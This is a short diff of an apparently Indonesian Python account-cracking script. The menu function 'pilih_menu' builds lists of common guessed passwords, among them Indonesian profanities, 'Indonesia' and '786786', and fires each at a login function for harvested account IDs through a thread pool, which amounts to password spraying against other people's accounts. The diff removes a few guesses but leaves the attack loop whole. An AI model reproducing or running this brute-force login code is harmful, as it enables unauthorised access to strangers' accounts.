@@ -224,9 +224,7 @@ def pilih_menu():
                     litpas.append('Bangsat')
                     litpas.append('Kontol')
                     litpas.append('Anjing')
-                    litpas.append('Memek')
                     litpas.append('Indonesia')
-                    litpas.append('Jakarta')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -318,7 +316,6 @@ def pilih_menu():
                       litpas.append('Bangsat')
                       litpas.append('Kontol')
                       litpas.append('Anjing')
-                      litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -343,7 +340,6 @@ def pilih_menu():
                       litpas.append('Bangsat')
                       litpas.append('Kontol')
                       litpas.append('Anjing')
-                      litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Done.')
